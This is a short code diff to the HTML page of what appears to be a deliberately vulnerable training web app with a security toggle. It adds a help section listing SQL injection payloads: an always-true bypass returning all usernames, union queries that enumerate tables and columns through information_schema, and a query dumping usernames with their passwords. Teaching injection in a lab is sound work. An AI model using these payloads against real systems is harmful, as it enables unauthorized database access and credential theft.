@@ -41,6 +41,19 @@
 
     <a href="/"><button class="button">Home</button></a>
 
+    <div>SQL Injection commands are below:</div>
+    <div>Standard (easy) command, returns all usernames:</div>
+    <div class="help">' or 1 = '1</div>
+    <div>Command for listing all tables in database:</div>
+    <div class="help">' union select 3,table_name,'1' from information_schema.tables where table_schema='public' union
+        select 5,'6','7</div>
+    <div>Command for listing all columns from database:</div>
+    <div class="help">' union select 3,column_name,null from information_schema.columns where table_name='users' union
+        select 5,'6','7</div>
+    <div>Command for listing all users with corresponding passwords:</div>
+    <div class="help">' union all select 3, concat(username, ':', password),'4' from Users union all select 5,'6','7
+    </div>
+
 
     <script>
         const securityToggle = document.getElementById('security-toggle');
